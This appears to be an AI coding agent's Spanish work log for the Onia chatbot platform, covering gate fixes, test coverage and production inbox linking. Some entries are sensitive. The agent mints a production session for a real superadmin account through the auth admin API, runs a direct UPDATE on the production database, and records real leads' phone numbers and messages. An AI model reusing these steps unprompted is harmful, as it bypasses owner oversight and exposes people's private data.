            — y pone rojo el gate que existe para detectar drift real.** Encontrado por las malas al
            cerrar el ítem de `hermes-content/deploy/vps-ops/bot/recepcionista.test.mjs`: después de mutar y restaurar
            `hermes-content/deploy/vps-ops/bot/recepcionista.mjs` con `git checkout --`, `hermes-content/deploy/vps-ops/bot/espejo-check.mjs` lo reportó **DISTINTOS**
            contra el VPS, mientras `git status --porcelain` daba **vacío**.
            **La causa, medida:** `core.autocrlf=true` y **no hay `.gitattributes`** en `onia-hermes`.
            Git guarda el blob en LF y lo materializa en CRLF al hacer checkout; el archivo pasó de
            **14110 bytes (LF, lo que corre el VPS) a 14375 (CRLF)** — exactamente +265, una por línea.
            Contenido idéntico: `diff` normalizando `\r` sale **vacío** contra
            `/opt/onia/bot/recepcionista.mjs`.
            **Por qué importa acá y no en otro carril:** `hermes-content/deploy/vps-ops/bot/espejo-check.mjs` compara **md5 de bytes**, y
            tiene que hacerlo — en un .sh un CRLF no es cosmético, el shebang con CR al final no arranca. O sea
            que el gate no puede perdonarlo, y entonces cualquiera que haga `git checkout` sobre el
            espejo fabrica un "deploy pendiente" que nadie pidió. Es el molde exacto del fantasma que
            este carril mide: **un rojo que no corresponde a ningún cambio se apaga o se "arregla"
            con un deploy inútil.**
            **El espejo hoy es una MEZCLA**, no todo LF: `hermes-content/deploy/vps-ops/bot/knowledge.mjs` está en LF en disco y en git
            (diff 0), mientras `hermes-content/deploy/vps-ops/bot/guardrails.mjs` (+130) e `hermes-content/deploy/vps-ops/bot/intents.mjs` (+754) están en CRLF en los dos
            lados. Por eso **no se arregló en esta vuelta**: un `.gitattributes` con `text eol=lf`
            renormalizaría ~60 archivos y desincronizaría contra el VPS todos los que hoy son CRJF de
            ambos lados — se arregla con un redeploy completo del directorio, y eso es de Sergio.
            **El parche de esta vuelta fue puntual:** `perl -pi -e 's/\r\n/\n/g'` sobre el archivo
            tocado, verificado con `hermes-content/deploy/vps-ops/bot/espejo-check.mjs` (vuelve a 14110 y sale del listado).
            **Lo mínimo que lo cierra:** decidir la política de line endings del espejo
            (`.gitattributes` con `eol=lf` + un redeploy del directorio entero, que alinea los dos
            lados de una vez) — o dejarlo escrito acá para siempre. Lo primero es un deploy: **de
            Sergio**. Tres opciones cotizadas en
            `hermes-content/docs/ONIA_RADAR_DECISIONES_PRODUCTO.md` §12 (recomendación: opción 1, y
            sola en su commit; la 3 —normalizar `\r` sólo en .mjs dentro de `hermes-content/deploy/vps-ops/bot/espejo-check.mjs`— es
            el paliativo si no hay ventana de deploy).

            ✅ **Vuelta del 2026-08-31 — la opción 3 (el paliativo) ESTÁ HECHA: el gate ya no
            fabrica rojos falsos.** Gate 1 primero, corriendo el gate contra producción: salía
            **rojo por `hermes-content/deploy/vps-ops/bot/recepcionista.test.mjs`**, y ese resultó ser drift REAL y no el fantasma del
            fin de línea — el archivo tiene **9783 bytes en el espejo y 0 en el VPS** (`d41d8cd9…`,
            el md5 del archivo vacío). O sea que el rojo de hoy no era el que este ítem describe; el
            defecto igual estaba vivo y sin arreglar.
            **La trampa medida hoy, que cambió desde que se escribió el ítem:** el espejo ya no es la
            mezcla pareja que dice arriba — **69 archivos de código están en CRLF en disco**
            (incluidos `hermes-content/deploy/vps-ops/bot/bot-engine.mjs`, `hermes-content/deploy/vps-ops/bot/knowledge.mjs`, `hermes-content/deploy/vps-ops/bot/run-turn.mjs` y el propio
            `hermes-content/deploy/vps-ops/bot/espejo-check.mjs`), mientras el blob de git es LF por `core.autocrlf=true`. El VPS
            también los tiene en CRLF, así que hoy coinciden **por casualidad**: alcanza un
            `git checkout` — o correr el gate desde Linux — para volver rojos ~60 archivos que nadie
            tocó.
            **Lo que se hizo:** `hermes-content/deploy/vps-ops/bot/espejo-check.mjs` exporta `md5Archivo(nombre, contenido)` y hashea el
            .mjs **sin el `\r`, de los dos lados** — local con `Buffer.filter`, y el comando remoto
            con `tr -d` en vez de `md5sum` a secas. Es `tr` y no `sed` a propósito: sed agrega un
            salto final si el archivo no lo tenía, y sin esa simetría exacta los dos hashes no
            comparan nunca. El .sh sigue byte-exacto — ahí el shebang con CR al final no arranca, y esa
            asimetría es la razón de que el gate no pueda perdonar el byte en general.
            **Probado contra producción y no con un fixture**, que es lo único que prueba que el lado
            remoto también normaliza: se pasó `hermes-content/deploy/vps-ops/bot/guardrails.mjs` a LF — **5636 → 5506 bytes, md5 crudo
            distinto**, con el VPS en CRLF — y el gate **no lo nombró**; antes de este cambio ése era
            exactamente el rojo falso. Restaurado byte a byte después (`441cdd70…`, 5636). Los tres
            rojos que quedan son honestos: `hermes-content/deploy/vps-ops/bot/recepcionista.test.mjs` (drift real, va en S9) y los dos
            archivos de este mismo cambio.
            **4 tests nuevos**, incluido el guardia que impide que el arreglo se vuelva una tapadera
            (*normalizar NO tapa el drift real*, con el caso de 0 bytes medido hoy) y el que fija la
            asimetría del .sh. Suite del bot **658/658** verde (654 antes).
            ⚠️ **Lo que NO cierra, y por eso el ítem queda abierto:** la opción 1 —`.gitattributes`
            con `eol=lf` + redeploy del directorio— sigue siendo de Sergio, y es la única que hace
            que el espejo sea un espejo. La 3 baja el ruido pero **deja los dos lados distintos de
            verdad**: el día que haga falta un `scp` selectivo por md5, el md5 crudo sigue sin
            coincidir. Radar §12 actualizado: de las tres opciones ya sólo queda viva la 1.
            📎 **Efecto secundario que hay que saber antes de mirar el gate:** `hermes-content/deploy/vps-ops/bot/espejo-check.mjs` y
            `hermes-content/deploy/vps-ops/bot/espejo-check.test.mjs` ahora salen DISTINTOS contra el VPS, porque son los archivos que
            acaban de cambiar. Es drift honesto y no urgente — son herramienta de desarrollo, no el
            motor: no cambian una línea de lo que corre. Se suman al `scp` de S9 cuando haya ventana.

            ✅ **Promovido a "Ahora" el 2026-08-31, y NO por turno: hoy tiene trabajo que ayer no
            tenía.** El ítem quedaba en Después porque su única salida viva —la opción 1,
            `.gitattributes` con `eol=lf`— arrastraba un redeploy del directorio entero, y eso es de
            Sergio. **Eso cambió con el paliativo de la séptima vuelta, y se midió antes de
            promoverlo, leyendo el gate y no el ítem:** `hermes-content/deploy/vps-ops/bot/espejo-check.mjs:37`
            hashea los .mjs **sin el `\r` de los dos lados** (`md5Archivo` local, `tr -d` remoto).
            O sea que forzar LF en los .mjs del espejo **ya no desincroniza nada contra el VPS**:
            el gate los compara normalizados. Confirmado además que el hueco sigue abierto:
            `git config core.autocrlf` → `true` y `.gitattributes` **no existe** en `onia-hermes`.
            ⚠️ **El .sh queda AFUERA del arreglo, a propósito** — ahí el byte sí cuenta
            (#!/bin/bash\r no arranca), el gate lo compara byte a byte, y tocarlo sí necesitaría
            el redeploy de Sergio. **Hecho =** `.gitattributes` que fuerza LF sólo en los .mjs del
            espejo, `hermes-content/deploy/vps-ops/bot/espejo-check.mjs` sigue en 0 contra producción después del checkout, y un test
            que se ponga rojo si alguien vuelve a dejar el directorio sin política.

      </details>

- [x] **El guardia de las frases de campaña medía el REPO, no la web que sirve producción — y
      la primera medición que lo destapó estaba ella misma rota.** Encontrado auditando los `[x]`
      recientes contra el código de hoy, que es lo que manda el loop cuando "Ahora" queda
      bloqueado (el único ítem de Ahora cuelga de S9, que es de Sergio).
      **Lo que se auditó primero, y salió cierto** — se escribe porque una auditoría que sólo
      reporta lo que falla no prueba que haya mirado:
      | afirmación de la cola | medido hoy |
      |---|---|
      | suite del bot **682/682** | `npm run test:bot` → **682 pass, 0 fail**: reproduce |
      | `espejo-check.mjs` sale 1 y nombra los archivos de S9 | exit **1**. DISTINTOS de motor = `knowledge.mjs` y `recepcionista.mjs`, **exactamente los dos** que S9 manda viajar; `bot-engine.mjs` ya está en sync |
      | objetivo CUMPLIDO: `Onia (interna)` → inbox 5 | base de producción: `c956c02fccd8573cd6fcc5b35` → **5**. El vínculo sigue vivo; las otras tres orgs siguen en NULL salvo la de QA (7) |
      | "este repo no tiene TS, eslint ni vitest" | `node_modules/.bin/` no tiene ninguno de los tres: el gate que aplica es la suite |
      📎 **Trampa de medición que se llevó una consulta y queda escrita:** `node gate.mjs | tail`
      reporta el `$?` de **`tail`**, no el del gate — salió `EXIT=0` sobre un gate que estaba
      diciendo `ESPEJO DESINCRONIZADO`. Un exit code se mide **sin pipe**.
      **El hueco, que no estaba escrito en ninguna parte.**
      `hermes-content/deploy/vps-ops/bot/campanas-web.test.mjs` extrae las frases en vez de
      hardcodearlas — bien — pero las extrae de `web-factory/apps/onia-platform/src/`, o sea del
      **repo**. Producción se sirve de un build, y la web es de **otro carril**: el día que
      web-factory despliegue un cambio que este árbol no tiene (o al revés), el test queda
      **verde** mientras el desconocido recibe el saludo genérico. Es el molde del carril entero:
      un guardia que mide el lado equivocado.
      **Medido contra producción y no leído:** las **5** frases que onia.com.bo manda hoy están
      las cinco cubiertas por el documento (4 exactas + el prefijo de `/v1/empezar`). Hoy
      coinciden; que coincidan era **suerte, no una medición**.
      **Lo que se hizo:** `hermes-content/deploy/vps-ops/campanas-vivas.mjs` — mira las frases
      **desde la calle**, igual que `chatwoot-marca-publica.mjs`: un GET a las 11 páginas, sin
      VPS, sin docker, sin token, desde cualquier máquina (`npm run campanas:vivas`). El match
      **no se reimplementa**: importa `campanaExacta` del motor, así que la regla del prefijo y la
      normalización son las de producción y no una copia que se despega. Corrido contra
      producción: `5 frases vivas, 5 con campaña (documento 2026-08-31.2)`, exit **0**.
      📎 **Un tropiezo que queda escrito porque casi cierra la vuelta al revés:** la primera
      medición usó una clase negativa con un backslash de menos, y en regex eso excluye la
      **letra `s`**. Cortaba "…Quiero " justo antes de "saber" y reportaba las cinco frases vivas
      como **SIN CAMPAÑA** — un rojo inventado sobre un dato de entrada truncado, y a un gate así
      lo apaga alguien. Por eso el extractor usa una clase **positiva** (lo que produce
      `encodeURIComponent`), que además corta sola donde tiene que cortar: en la comilla del href
      suelto y en la barra invertida del payload RSC de Next.
      **11 tests** (`npm run test:campanas-vivas`), **probado que pueden fallar**: reinyectada la
      clase negativa con el backslash de menos, **3 se ponen rojos** y uno nombra el corte en la
      `s`. Restaurado byte a byte después.
      ⚠️ **Lo que este gate NO hace, dicho para que nadie lo cuente de más:** mide que el
      **documento** cubra lo que la web manda. **No** mide que el VPS tenga el documento — eso
      sigue siendo **S9**, y se verifica con el `grep -c campanas` dentro del contenedor. Uno se
      corre **antes** de publicar, el otro **después**.
      📎 Va en `vps-ops/` y no en `bot/` por la misma razón que `chatwoot-marca-publica.mjs`:
      un `.mjs` nuevo en `bot/` deja `espejo-check.mjs` rojo hasta el próximo `scp`. Verificado
      después de crearlo — el espejo nombra los mismos archivos de siempre.
      **Gates:** suite del bot **682/682** (no se tocó el motor) + los **11** nuevos. Este repo no
      tiene tsc/eslint/vitest: la suite es el gate que aplica.

- [x] **1 · Una org sólo puede tener UN inbox, y nadie puede cambiarlo — así ningún WhatsApp
      llega nunca a la bandeja.** Éste es el hueco que hace inalcanzable el objetivo, y no
      estaba escrito en ninguna parte. Verificado hoy, en cuatro archivos:
      - Al crear la org se le crea un inbox **web** y ése se guarda:
        `app/api/admin/clinics/route.ts:97` (`createInbox` + `update chatwootInboxId`).
      - Una vez puesto, **nunca se pisa**: `lib/chatbot/canal-web.ts:27` devuelve
        `created:false` y se va; `app/api/admin/chatbots/route.ts:53` hace lo mismo.
      - La única pantalla que lo muestra es **de sólo lectura**:
        `app/(dashboard)/admin/organizations/[id]/WhatsAppOrgConfig.tsx:215` lo pinta en un
        `<dd>`, sin input ni PATCH.
      - Y no hay nada del otro lado: **cero apariciones** de `embedded` en todo `app/` y
        `lib/` de la plataforma.
      **Medido en la base el 2026-08-31 (ya no es una lectura de código, es el estado real):**
      de las cuatro orgs que existen, **una sola tiene inbox — y es la org QA**
      (`ZZ QA Clinica Chatbot` → inbox 7). Las otras tres (`Onia (interna)`,
      `Bolivian electricidad`, `ZZ QA Ferreteria Tornillo`) tienen `chatwootInboxId` en NULL.
      Los dos inboxes donde escribió gente de verdad — **4 (Onia Web)** y **5 (Onia WhatsApp)** —
      no son de ninguna org. La tenencia la da esa columna y sólo esa
      (`lib/chatbot/bandeja-auth.ts:22`), así que hoy `/inbox` sólo puede mostrar conversaciones
      QA: las nuestras.
      **La consecuencia hoy:** el inbox de WhatsApp del +591 75414930 existe en Chatwoot
      (alta manual, hecha dos veces) pero no es el `chatwootInboxId` de ninguna org, así que
      `lib/chatbot/bandeja.ts` no lo puede mostrar. **Y ya costó:** las cinco conversaciones de
      desconocidos que se contaron hoy están todas en los inboxes 4 y 5 — ninguna se ve. Este
      ítem dejó de ser un riesgo futuro: es la única pieza entre el objetivo y estar cumplido. **La consecuencia mañana:** el día que
      Sergio corra la prueba del popup de Embedded Signup, nace un inbox de WhatsApp que la
      plataforma **va a ignorar** — el cliente conecta su número y su bandeja sigue vacía. La
      pieza que gatea todo el carril entrega un inbox huérfano.
      **Hecho =** un mensaje enviado al +591 75414930 aparece en `/inbox`, MIRADO con captura.
      **Lo mínimo que lo logra** (elegir al construir, no ahora): un PATCH de superadmin que
      apunte una org a un inbox existente. Lo caro sería una tabla de N inboxes por org —
      no hace falta hasta que un cliente tenga web **y** WhatsApp a la vez.

      ⚙️ **El código está construido y con gates verdes (2026-08-31, commit `88c1d56` del repo
      `onia-platform`), pero el ítem NO se cierra: sigue sin haber una conversación de un
      desconocido visible en `/inbox`, que es el objetivo.** Lo que se hizo: se extendió el
      PATCH de superadmin que YA existía (`app/api/admin/organizations/[id]/whatsapp/route.ts`)
      en vez de agregar una ruta nueva — acepta `chatwootInboxId` entero positivo o `null` para
      desvincular, y devuelve **409 si otra org ya usa ese inbox** (sin ese guardia dos orgs
      se ven las conversaciones entre sí: la tenencia la da esa sola columna). La pantalla
      `app/(dashboard)/admin/organizations/[id]/WhatsAppOrgConfig.tsx` dejó de ser un `<dd>`
      de sólo lectura: ahora es input + botón "Vincular". 11 tests nuevos; `tsc --noEmit`,
      `eslint` y los 2342 tests de la suite, verdes.
      ⚠️ **Falta lo que no depende de código, y son las dos cosas que lo cierran:** (1) el
      deploy del producto, que es de Sergio, y (2) decidir qué org se queda con los inboxes 4
      y 5 — anotado como **S8**, y cotizado en
      `hermes-content/docs/ONIA_RADAR_DECISIONES_PRODUCTO.md`.
      ⚠️ **La pantalla NO se pudo MIRAR, y se dice en vez de simularlo:** es superadmin, así
      que necesita base + sesión. El `DATABASE_URL` de `.env.local` apunta a
      `127.0.0.1:54329`, que está cerrado (de los puertos de Supabase local sólo 54322 acepta
      conexión TCP, y ahí el handshake de Postgres expira). Producción sí responde pero
      todavía sirve la versión vieja. **La captura se toma en el primer deploy** — es lo
      primero que hay que hacer al retomar, antes que cualquier ítem nuevo.

      ✅ **Vuelta del 2026-08-31 (tercera) — la pantalla YA SE MIRÓ, y no hizo falta ningún
      deploy: lo que estaba roto era el entorno local, no la base.** El diagnóstico de arriba
      era correcto en el síntoma y equivocado en la causa, y por eso el ítem quedó tres
      vueltas esperando a Sergio para algo que no dependía de él.
      **La causa real.** El stack de Supabase local **está corriendo hace 31 h**
      (`docker ps` → `supabase_db_fiscal-mock`, healthy). Lo que no existe son los puertos que
      `.env.local` pedía: `supabase/config.toml` del propio repo declara API `55321` y
      Postgres `55322`, mientras el env apuntaba a `54321`/`54329`. Y `54329` no era "un
      puerto cerrado" cualquiera: es el del **pooler, que el config tiene `enabled = false`**,
      con un usuario ("postgres" con sufijo "onia") que ni figura en `pg_user`. Las claves anon y
      service_role tampoco eran las del stack — firmadas con otro secreto, daban 403 contra
      `/auth/v1/admin/*`. Tres datos mal, ninguno de ellos la base.
      **Lo que se hizo:** se corrigió `.env.local` (puertos reales, `postgres:postgres`,
      `?schema=public` como producción, claves firmadas con el `GOTRUE_JWT_SECRET` del
      contenedor), se creó un superadmin local (usuario por `/auth/v1/admin/users` + su fila
      en `profiles` con `role='SUPERADMIN'`), y se levantó el producto con
      `npm run build` + `node .next/standalone/server.js`.
      **Lo verificado MIRANDO, en la pantalla real** (`/admin/organizations/<id>`, sesión de
      superadmin, captura leída):
      1. La tarjeta **ESTADO TÉCNICO** ya no es un `<dd>`: muestra *"Chatwoot Inbox ID · De la
         tenencia de la bandeja. Vaciar para desvincular."* con input numérico (`No vinculado`)
         y botón **Vincular**.
      2. Vincular el inbox 5 a `Ferreteria Circuito Completo` → banner verde
         **"Org vinculada al inbox 5."**, y la fila queda persistida en la base
         (`clinic_settings.chatwootInboxId = 5`, releída por SQL después del click).
      3. **El guardia de tenencia funciona:** el mismo inbox 5 sobre la otra org devuelve el
         409 con su mensaje en pantalla — *"El inbox 5 ya es de «Ferreteria Circuito
         Completo»"* — y la base sigue con una sola org vinculada. Sin ese guardia dos orgs se
         leerían las conversaciones entre sí, así que era la parte frágil y es la que se probó.
      **La receta completa quedó en la skill que corresponde**, no en un doc suelto:
      `.claude/skills/onia-verificacion/SKILL.md` del repo onia-platform, § "Levantar el entorno LOCAL
      para poder MIRAR" — incluye las trampas que costaron esta vuelta (Prisma no lee
      `.env.local`; `?schema=dentalgest` hace fallar una migración que en `public` está bien;
      `onboardingCompletedAt` en NULL redirige todo a `/onboarding`; `next dev` en Windows
      panickea con Turbopack y recarga en loop con `--webpack`).
      🔗 **Hermano del mismo agujero, arreglado hoy por el carril de plataforma** (commit
      `7791ea3`, `onia-platform`): `encenderCanalWeb()` adoptaba un inbox de Chatwoot buscándolo
      **por nombre**, y el inbox se llama igual que la org — con dos "Clínica Dental" la
      segunda se quedaba con la bandeja de la primera. Es la misma llave de tenencia que este
      ítem: el PATCH ya tenía su 409, y ahora el alta automática también filtra los inboxes ya
      tomados. Se anota para que no se lo cuente dos veces: **no destraba nada de S8**.
      ⚠️ **Esto NO cierra el ítem** — el "Hecho =" sigue siendo un mensaje de un desconocido
      visible en `/inbox`, y para eso falta **S8** (deploy + dueño de los inboxes 4 y 5). Lo
      que cierra es la duda sobre el código: la pieza que S8 va a encender está mirada y
      probada, incluido su caso de error.

      ✅ **Gate 1 del 2026-08-31 (cuarta vuelta): EL DEPLOY YA ESTÁ HECHO. S8 se achicó a la
      mitad — queda la decisión y dos clicks, nada más.** Medido en producción, no leído:
      - **El build del producto trae el PATCH.** `onia-platform` buildeó a las 22:59 y el
        contenedor arrancó 23:00 (UTC). En sus chunks del servidor están las dos cadenas
        exactas de `88c1d56`: `` El inbox ${d} ya es de "${e.organization?.name…`` (el 409 de
        tenencia) y `chatwootInboxId debe ser un entero positivo o null` (el 400).
        ⚠️ **Y acá casi escribo el fantasma al revés:** el primer `grep` acotado a
        `.next/server/app/api/admin/organizations/` dio **cero** y parecía probar que el deploy
        no traía nada. Era falso — `route.js` son 648 bytes de loader y el código vive en
        `chunks/[root-of-the-server]__*.js`. Un grep que no encuentra descarta un lugar, no
        el hecho.
      - **La base sigue sin vincular.** Consultada en vivo (`supabase-db`, schema `public`): de
        las cuatro orgs, la única con `chatwootInboxId` es `ZZ QA Clinica Chatbot` → 7.
        `Onia (interna)`, `Bolivian electricidad` y `ZZ QA Ferreteria Tornillo` en NULL. Los
        inboxes 4 y 5 siguen huérfanos, así que las cinco conversaciones de desconocidos
        siguen invisibles.
      **Lo que queda de S8, entero:** entrar a `/admin/organizations/<id>` de `Onia (interna)`,
      escribir `5` y apretar Vincular. La pantalla ya está desplegada y ya fue mirada.

      ✅ **Gate 1 del 2026-08-31 (quinta vuelta) — sigue igual, y se midió en la base, no se
      leyó.** Consultada en vivo (`supabase-db`, schema `public`), de las cuatro orgs la única
      con `chatwootInboxId` sigue siendo `ZZ QA Clinica Chatbot` → 7; `Onia (interna)`,
      `Bolivian electricidad` y `ZZ QA Ferreteria Tornillo` en NULL. **Los dos clicks de S8 no
      se dieron todavía**, así que las cinco conversaciones de desconocidos siguen invisibles y
      el ítem sigue siendo el único que separa al carril de su objetivo. No se tocó la base:
      elegir dueño de inbox decide en qué bandeja aterrizan personas reales, y eso es de Sergio.

      ✅ **Gate 1 del 2026-08-31 (octava vuelta) — la base sigue igual, medida en vivo.** `supabase-db`, schema `public`: de las cuatro orgs la única con `chatwootInboxId` sigue siendo `ZZ QA Clinica Chatbot` → 7; `Onia (interna)`, `Bolivian electricidad` y `ZZ QA Ferreteria Tornillo` en NULL. **Los dos clicks de S8 siguen sin darse**, así que las cinco conversaciones de desconocidos siguen invisibles. No se tocó la base: elegir dueño de inbox decide en qué bandeja aterrizan personas reales, y eso es de Sergio.

      ✅ **Gate 1 del 2026-08-31 (séptima vuelta) — la base sigue igual, medida en vivo.** `supabase-db`, schema `public`: de las cuatro orgs la única con `chatwootInboxId` sigue siendo `ZZ QA Clinica Chatbot` → 7; `Onia (interna)`, `Bolivian electricidad` y `ZZ QA Ferreteria Tornillo` en NULL. **Los dos clicks de S8 siguen sin darse.** No se tocó la base: elegir dueño de inbox decide en qué bandeja aterrizan personas reales.

      ✅ **Gate 1 del 2026-08-31 (sexta vuelta) — sin cambios en la base, y se despejó la ÚLTIMA duda del ítem.** La base sigue igual (medida en vivo: sólo `ZZ QA Clinica Chatbot` → 7; `Bolivian electricidad` y `ZZ QA Ferreteria Tornillo` en NULL). Lo nuevo es que se comprobó que **los dos clicks alcanzan de verdad**: el producto lee las conversaciones con su propio token, y en Chatwoot un token de agente que no es miembro del inbox habría devuelto la lista vacía con 200 — exactamente el fantasma que este carril mide. Corrido contra producción, el token del contenedor `onia-platform` ve **inbox 4 → 5 · inbox 5 → 3 · inbox 7 → 6** conversaciones, con `+59173021804` en el payload del 5. Detalle y comando en **S8**. **No queda nada que verificar del lado del código.**

      ✅ **CERRADO el 2026-08-31 (novena vuelta) — Sergio dio los dos clicks, y la pantalla
      se MIRÓ: hay dos desconocidos en `/inbox` de producción.** Es el objetivo del carril
      entero, y es la primera vez que se cumple.
      **Gate 1, medido en la base y no leído** (`supabase-db`, schema `public`): de las cuatro
      orgs, `Onia (interna)` ya tiene `chatwootInboxId = 5` — la opción 1 recomendada en el
      radar. `ZZ QA Clinica Chatbot` sigue en 7; las otras dos en NULL, que es lo correcto.
      **Y se MIRÓ la pantalla real de producción, con sesión del dueño de esa org**
      (`superadmin@onia.com.bo`, el único perfil de `Onia (interna)`), no una simulación:
      `https://app.onia.com.bo/inbox` devuelve 200 y la lista trae, con su globo de no-leído
      en 1 cada una:
      | quién | cuándo | qué escribió |
      |---|---|---|
      | **mariohassen** (+591 73021804) | 27 ago | *"Hola, vengo de la web de Onia. Quiero saber si me sirve para mi negocio."* |
      | **F** (+591 73232758) | 25 ago | la consulta larga de la clínica odontológica de 4 doctores (seguimiento de pacientes, reportes, costo) |
      | Sergio | 17 ago | "Hola" — éste sí somos nosotros |
      Los dos primeros **no son QA, ni el probador, ni Sergio**: son las conversaciones 37 y 35
      que la cola venía contando como invisibles. La frase de mariohassen es además, palabra por
      palabra, la de `WA_URL_LANDING` de onia.com.bo — o sea que el circuito completo
      (web → wa.me → +591 75414930 → Cloud API → Chatwoot → `/inbox`) quedó cerrado y visible.
      📎 **Cómo se miró, para que no cueste la próxima vez.** No hizo falta ni Docker ni el
      entorno local (Docker Desktop no levanta su motor WSL en esta máquina sin GUI): se generó
      una sesión del perfil interno con la admin API de GoTrue
      (`generate_link` → `verify`, que NO manda correo) y se armaron los cookies con el propio
      `@supabase/ssr` en vez de adivinarlos — el nombre sale de la URL de Supabase
      (`sb-app-auth-token`) y el chunking lo decide la librería. Sólo lectura: no se abrió
      ninguna conversación, así que no se marcó nada como leído en el Chatwoot de gente real.
      ⚠️ **Lo que este ítem NO cierra:** contestarles. Son personas reales esperando desde hace
      3-6 días y vende Sergio — sigue siendo **S7**.


- [x] **El número que la cola reporta verde NO incluía los 12 evals: `node --test *.test.mjs`
      los saltea, y son justo los graders que ya habían estado muertos días.** Encontrado
      auditando los `[x]` recientes contra el código de hoy — que es lo que manda hacer el loop
      cuando "Ahora" queda bloqueado —, corriendo la suite y no leyéndola.
      **La medición, los dos comandos, hoy:**
      | comando | tests | incluye `evals/` |
      |---|---|---|
      | `node --test *.test.mjs` (dentro de `bot/`) | **658** | **no** |
      | `node --test` (bare, recursivo) | **670** | sí (658 + 12) |
      Los 12 evals viven en `hermes-content/deploy/vps-ops/bot/evals/evals.test.mjs`, o sea en un
      subdirectorio, y el glob `*.test.mjs` **no baja un nivel**. El "658/658 verde" que quedó
      escrito arriba es el número del glob: real, pero **medido con un comando que no corre los
      graders que miden que el bot no cotiza precios, no promete y deriva al humano**.
      **Por qué esto es el mismo fantasma y no uno nuevo.** El ítem de arriba —*"Los 12 evals
      estaban MUERTOS hace días y la cola reportaba 634/634 verde"*— se cerró arreglando el
      `export LLM_SYSTEM_PROMPT`. Correcto, pero incompleto: arregló **el síntoma de esa vez** y
      dejó viva **la razón por la que nadie lo vio**, que es que el número reportado se saca de un
      comando ciego a `evals/`. Sin esto, el próximo export que se caiga vuelve a desaparecer en
      silencio.
      **Lo que se hizo, y es lo mínimo que cierra las dos mitades:**
      1. **Un solo comando, y que sí los corra:** `npm run test:bot` (`package.json` de
         `onia-hermes`) = `cd hermes-content/deploy/vps-ops/bot && node --test`. Corrido hoy:
         **676/676 verde** (670 + los 6 del guardia). Es la forma recursiva, así que ningún
         subdirectorio de tests puede quedar afuera.
      2. **El cable-trampa DENTRO del glob que sí se reporta:**
         `hermes-content/deploy/vps-ops/bot/evals-contrato.test.mjs`. **Parsea los imports del
         propio `evals.test.mjs`** y verifica contra los módulos reales que cada nombre siga
         exportándose — así cubre los cinco (`bot-engine`, `guardrails`, `bench`, `run-turn`,
         `persistence`), no sólo el que se rompió aquella vez. Si un export desaparece, se pone
         rojo **en el número que la gente mira**, en vez de en un archivo que ese comando no abre.
      **Probado que puede fallar, que es lo único que prueba que un guardia sirve:** se le sacó el
      `export` a `LLM_SYSTEM_PROMPT` en `run-turn.mjs` y el guardia salió **5 pass / 1 fail**,
      nombrando el módulo y el export exactos (*"../run-turn.mjs ya no exporta LLM_SYSTEM_PROMPT"*)
      — reproduciendo `d334d776` a pedido. `run-turn.mjs` restaurado byte a byte después
      (`git diff` vacío). Incluye además el test que impide que el guardia se vuelva un verde
      hueco: si el parser encontrara menos de 4 imports relativos, falla.
      **Gates:** este repo no tiene TS, eslint ni vitest (el bot es ESM plano con `node:test`), así
      que el gate que aplica es la suite — **676/676**, con los 12 evals adentro y verificados
      aparte (**12/12**).
      📎 **Drift honesto que esto suma al `scp` de S9:** `espejo-check.mjs` ahora nombra
      `evals-contrato.test.mjs` en FALTAN EN EL VPS. Es un test, no el motor: no cambia una línea
      de lo que corre. Los tres DISTINTOS (`espejo-check.mjs`, `espejo-check.test.mjs`,
      `recepcionista.test.mjs`) ya estaban antes de esta vuelta.

- [x] **El objetivo del carril se REVIRTIÓ en silencio: `Onia (interna)` dejó de apuntar al
      inbox 5 (WhatsApp) y pasó a apuntar al 4 (Web) sin que nadie lo tocara desde la UI —
      encontrado auditando "Después" (Ahora estaba vacío) y corregido en la misma vuelta.**
      **Gate 1, medido en la base de producción, no leído:** `clinic_settings` de
      `Onia (interna)` (`organizationId c956c02fccd8573cd6fcc5b35`) tenía
      `chatwootInboxId = 4`, no `5` como dejó cerrado S8 el 31-ago. Consecuencia real, medida
      contra Chatwoot: `/inbox` de esa org mostraba las conversaciones del **inbox 4** (los seis
      desconocidos del widget, la mayoría sin teléfono) y **dejaba invisibles otra vez a
      mariohassen (+591 73021804) y F (+591 73232758)** — los dos leads de WhatsApp que **S7**
      da por visibles y esperando respuesta de Sergio. El objetivo técnico ("una conversación de
      un desconocido en `/inbox`") seguía cumplido por casualidad (inbox 4 también tiene
      desconocidos), pero **S7 quedó roto sin que la cola lo supiera**.
      **Lo sospechoso que separa esto de un simple click accidental:** la fila de
      `clinic_settings` para esa org tiene `id = ab6e629f-f798-4a7f-87df-12ec1c7fac0b` — formato
      **UUID con guiones** — mientras las otras tres filas de la misma tabla son `cuid()` de
      Prisma (`cmsvyguwn…`, `cmsw0e759…`, `cmthllqlp…`, todas minúsculas sin guion). `createdAt =
      updatedAt = 2026-09-01 02:02:47`, y **todos** los demás campos están en su default de
      schema (horario 08:00-18:00, sin `botPrompt`, sin `oniaCoreOnboarding`). Ningún camino de
      `onia-platform` genera un id con ese formato: `ClinicSettings.id` es
      `@default(cuid())` (`prisma/schema.prisma:989`) en los cuatro lugares que crean la fila
      (`admin/clinics/route.ts`, `lib/platform/provisioning.ts`, `lib/onia-core/onboarding.ts`,
      `lib/chatbot/canal-web.ts`). O sea: la fila vieja (con `chatwootInboxId=5`) no se
      actualizó, se **BORRÓ y se re-creó desde cero por fuera de la app**, a las 02:02 de la
      madrugada del 1-sep. No se encontró en el repo (`onia-platform` ni `onia-hermes`) ningún
      script, migración o cron que haga ese INSERT — se buscó con `git log -S`, grep de
      `clinicSettings.create/upsert/delete` y los crons del VPS. **Queda sin confirmar el
      mecanismo exacto**; lo único descartado con evidencia es que haya sido un camino normal de
      la app (habría dejado un `cuid()`, no un UUID).
      **Lo que se hizo:** verificado primero que **ningún otro org usa el inbox 5** hoy
      (`SELECT "chatwootInboxId" FROM clinic_settings` → sólo 4 y 7 ocupados), exactamente el
      guardia de 409 que ya tiene `app/api/admin/organizations/[id]/whatsapp/route.ts`. Con eso
      confirmado, se restauró con un `UPDATE` directo a `chatwootInboxId=5` — la misma escritura
      que hace ese endpoint, sin tocar código ni desplegar nada. Verificado después contra
      Chatwoot: inbox 5 vuelve a traer `37 mariohassen`, `35 F`, `11 Sergio`; la base vuelve a
      leer `Onia (interna) → 5`, `ZZ QA Clinica Chatbot → 7`, las otras dos en NULL — el mismo
      estado que dejó cerrado S8.
      ⚠️ **Lo que NO se cerró, y por qué queda anotado y no en Bloqueado:** no depende de una
      decisión de Sergio, así que no bloquea la cola — pero el mecanismo que borró la fila sigue
      sin identificarse, y si vuelve a correr, revierte esto otra vez sin avisar.
